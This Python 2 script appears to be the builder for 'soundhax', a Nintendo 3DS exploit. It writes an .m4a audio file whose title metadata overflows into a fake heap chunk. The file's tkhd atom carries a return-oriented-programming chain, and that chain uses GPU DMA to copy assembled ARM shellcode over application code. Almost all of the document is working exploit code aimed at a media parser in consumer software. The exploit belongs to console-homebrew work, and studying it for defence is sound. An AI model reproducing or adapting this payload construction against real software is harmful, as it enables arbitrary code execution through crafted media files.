#!/usr/bin/python2.7

import sys
from struct import pack
from subprocess import call
from constants import STAGE2_SIZE, OTHERAPP_CODE_VA, constants_pre_21, constants_21_22, constants_3x_and_later
from os import environ, path, name as osname

REGION = "usa"
TYPE = "old"
FIRM = "post5"
POST5FRANKEN = False
if len(sys.argv) > 1:
    REGION = sys.argv[1].lower()

if len(sys.argv) > 2:
    TYPE = sys.argv[2].lower()

if len(sys.argv) > 3:
    FIRM = sys.argv[3].lower()

if len(sys.argv) > 4:
    POST5FRANKEN = sys.argv[4].lower() == "true"

# Check for impossible combinations
if TYPE not in ("old", "new"):
    print("Error: invalid console type: {}".format(TYPE))
    sys.exit(1)
if FIRM not in ("pre21", "v21and22", "v3xand4x", "post5"):
    print("Error: invalid system version range: {}".format(FIRM))
    sys.exit(1)
if TYPE == "new" and FIRM != "post5":
    print("Error: can only use \"post5\" for N3DS")
    sys.exit(1)
if FIRM in ("pre21", "v21and22") and REGION not in ("usa", "eur", "jpn"):
    print("Error: {} can only be used for USA/EUR/JPN regions".format(FIRM))
    sys.exit(1)
if FIRM in ("v3xand4x", "post5") and POST5FRANKEN:
    print("Error: use normal \"post5\", no need for franken build")
    sys.exit(1)

constants = {
    "pre21": constants_pre_21,
    "v21and22": constants_21_22,
    "v3xand4x": constants_3x_and_later,
    "post5": constants_3x_and_later,
}[FIRM]

for name, regions in constants.items():
    if REGION not in regions:
        print("Error: {} does not contain a constant for {}".format(REGION,
                                                                    name))
        sys.exit(1)
    globals()[name] = regions[REGION]

def p(x):
    return pack("<I", x)

def pb(x):
    return pack(">I", x)

def get_arm_none_eabi_binutils_exec(name):
    exec_path = path.join(environ["DEVKITARM"], "bin", "arm-none-eabi-{0}".format(name))
    if osname == "nt":
        exec_path = ''.join((exec_path[1], ':', exec_path[2:])).replace('/', '\\')
    return exec_path

def get_shellcode():
    # assemble stage 2
    call([get_arm_none_eabi_binutils_exec("gcc"), "-x", "assembler-with-cpp", "-nostartfiles", "-mcpu=mpcore",
        "-nostdlib", "-D", REGION.upper(), "-D", TYPE.upper(), "-D", FIRM.upper(), "-o", "stage2.bin", "stage2.s"])
    # generate raw instruction bytes
    call([get_arm_none_eabi_binutils_exec("objcopy"), "-O", "binary", "stage2.bin"])
    # read in the shellcode
    with open('stage2.bin', 'rb') as f:
        payload = f.read()
        assert len(payload) == STAGE2_SIZE
        return payload

def create_heap_chunk(prv, nxt, sz):
    r  = "DU\x00\x00" # "used" marker, plus alignment-related fields = 0
    r += p(sz)        # size, < 0x10 to avoid putting it in free list
    r += p(prv)
    r += p(nxt)
    return r

malloc_free_list_head = heapctx + 0x3C

UNICODE_MARKER = '\xff\xfe' # unicode marker

exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
exp += " \x00"*((772-len(exp)) / 2)
assert len(exp) == 772

# Set malloc_free_list_head = fake_free_chunk
# This also does fake_free_chunk->prev = malloc_free_list_head, which means
# malloc_free_list_head = NULL after the subsequent "stack" allocation.
# This should be fine unless we take over the control flow too late.
exp += create_heap_chunk(malloc_free_list_head - 12, fake_free_chunk, 0)

def pa_to_gpu(pa):
    return pa - 0x20000000 + 0x14000000

def gpu_to_pa(gpua):
    return gpua - 0x14000000 + 0x20000000

def code_va_to_pa(va):
    """
    Since the APPLICATION memregion is unused before we start up the application,
    the image is allocated from the end of the memregion, at end(APPLICATION) - code_image_size
    (linear mem is allocated from the start).

    Before system version 5.0, the image VA<>PA mapping is flat. On 5.0 and above, however,
    the kernel tries to optimize the layout by giving mappings that as as large as possible.

    Since .text is the only section/segment being bigger than 1MB (it's almost 2MB in size), its first
    MB is given a "section" (1MB) mapping at end(APPLICATION) - 2MB.
    """
    off = va - 0x00100000
    appmem_end = 0x24000000 if TYPE == "old" else 0x27C00000

    if FIRM == "post5" or TYPE == "new" or POST5FRANKEN:
        return appmem_end - 0x00200000 + off
    else:
        return appmem_end - code_image_size + off

def code_va_to_gpu(va):
    return pa_to_gpu(code_va_to_pa(va))

payload = get_shellcode()

rop  = p(pop_r0_pc) # pc
rop += p(payload_heap_addr) # dst
rop += p(pop_r1_pc)
rop += p(payload_stack_addr) # src
rop += p(pop_r2_thru_r6_pc) #pc
rop += p(STAGE2_SIZE) #length
rop += "bbbb" # r3
rop += "cccc" # r4
rop += "dddd" # r5
rop += "eeee" # r6
rop += p(memcpy_gadget) # pc
rop += "aaaa" # r4
rop += "bbbb" # r5
rop += "cccc" # r6
rop += "dddd" # r7
rop += "eeee" # r8
rop += "ffff" # r9
rop += "gggg" # r10
rop += p(pop_r0_pc)
rop += p(payload_heap_addr) # r0
rop += p(pop_r1_pc)
rop += p(0x1000)
rop += p(gpu_flushcache_gadget)
rop += "bbbb" # r4
rop += "cccc" # r5
rop += "dddd" # r6
rop += p(gpu_enqueue_gadget)
if REGION not in ('kor', 'chn', 'twn'):
    rop += "aaaa" # skipped
rop += p(4)
rop += p(payload_heap_addr)
rop += p(code_va_to_gpu(stage2_code_va))
rop += p(STAGE2_SIZE)
rop += p(0)
rop += p(0)
rop += p(8)
rop += p(0)
if REGION in ('kor', 'chn', 'twn'):
    rop += "aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
rop += "AAAA" # r4
rop += "AAAA" # r5
rop += "AAAA" # r6
rop += "AAAA" # r7
rop += "AAAA" # r8
rop += "AAAA" # r9
if REGION not in ('kor', 'chn', 'twn'):
    rop += "AAAA" # r10
    rop += "AAAA" # r11
rop += p(pop_r0_pc) # pc
rop += p(0x10000000) # r0
rop += p(pop_r1_pc) # pc
rop += p(0) # r1
rop += p(sleep_gadget) # pc # {R4-R6,LR}
rop += "aaaa" # r4
rop += p(code_va_to_gpu(OTHERAPP_CODE_VA)) # r5
rop += "cccc" # r6
rop += p(stage2_code_va)
rop += payload

tkhd_data = 'P'*fake_free_chunk_padding # padding
tkhd_data += rop # ROP starts here
tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
tkhd_data += '0000000000000000010000000000000000000000000000400000000000000000000000'.decode("hex")

assert len(tkhd_data) < 0x800 # so we don't allocate off the tail.

l = [('ftyp', '4d344120000000004d3441206d70343269736f6d00000000'),
    ('mdat', '00'),
    ('moov',
        [
        ('mvhd', '00'),
        ('trak',
            [
            ('tkhd', tkhd_data.encode("hex")),
            ('mdia',
                [
                ('mdhd', '00000000aac54f45aac54f4500003e800000940000000000'),
                ('hdlr', '0000000000000000736f756e00000000000000000000000000'),
                ('minf',
                    [
                    ('smhd', '0000000000000000'),
                    ('dinf',
                        [
                        ('dref', [('url ', '00000001')])
                        ]),
                    ('stbl',
                        [
                        ('stsd', [('mp4a', [('esds', '000000000380808022000200048080801440150018000000fa000000fa0005808080021408068080800102')])]),
                        ('stsz', '00'),
                        ('stts', '00000000000000010000002500000400'),
                        ('stco', '000000000000000100000028'),
                        ('stsc', '0000000000000001000000010000002500000001')
                        ])
                    ])
                ])
            ]),
        ('udta',
            [('meta', [
                ('hdlr', '00000000000000006d6469726170706c000000000000000000'),
                ('ilst',
                    [('\xa9nam', [('data', '0000000100000000' + (UNICODE_MARKER + exp).encode("hex"))]),
                     ('\xa9ART', [('data', '00000001000000004e6564')]),
                     ('\xa9alb', [('data', '00000001000000004e696e74656e646f2033445320536f756e64')]),
                     ('\xa9day', [('data', '000000010000000032303030')]),
                     ('edoc', [('data', '00000001000000003344533100')]),
                     ('wtfs', [('data', '0000000100000000303032303500')]),
                     ('dicr', [('data', '0000000100000000343935414236383100')]),
                     ('dide', [('data', '0000000100000000343935414236383100')]),
                     ('tmrp', [('data', '000000010000000075706c6f61642c65646974446973747269627574652c6669727374446973747269627574652c7365636f6e644469737472696275746500')])
                     ])
                ])
            ])
        ])
    ]

prefixes = {
    'meta': '\x00\x00\x00\x00',
    'stsd': '\x00\x00\x00\x00\x00\x00\x00\x01',
    'dref': '\x00\x00\x00\x00\x00\x00\x00\x01',
    'mp4a': '\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
}

def to_string(tree):
    def internal(tree):
        sz = 0
        ret = ""
        for name, data in tree:
            if type(data) is str:
                rdata = data.decode("hex")
                chunk_size = len(rdata)
            else:
                chunk_size, rdata = internal(data)
                chunk_size
            chunk_size += 8

            prefix = prefixes.get(name, '')
            rdata = prefix + rdata
            chunk_size += len(prefix)

            sz += chunk_size
            ret += pb(chunk_size) + name + rdata
        return sz, ret
    _, res = internal(tree)
    return res

if TYPE == "new":
    fn = './soundhax-{}-{}.m4a'.format(REGION, "n3ds")
else:
    assert TYPE == "old"
    if FIRM == "pre21":
        if POST5FRANKEN:
            fn = './soundhax-{}-{}-{}-post5franken.m4a'.format(REGION, "o3ds", "pre2.1")
        else:
            fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "pre2.1")
    elif FIRM == "v21and22":
        if POST5FRANKEN:
            fn = './soundhax-{}-{}-{}-post5franken.m4a'.format(REGION, "o3ds", "v2.1and2.2")
        else:
            fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "v2.1and2.2")
    elif FIRM == "v3xand4x":
      fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "v3.xand4.x")
    else :
      fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "post5.0")

with open(fn, 'wb') as f:
  f.write(to_string(l))
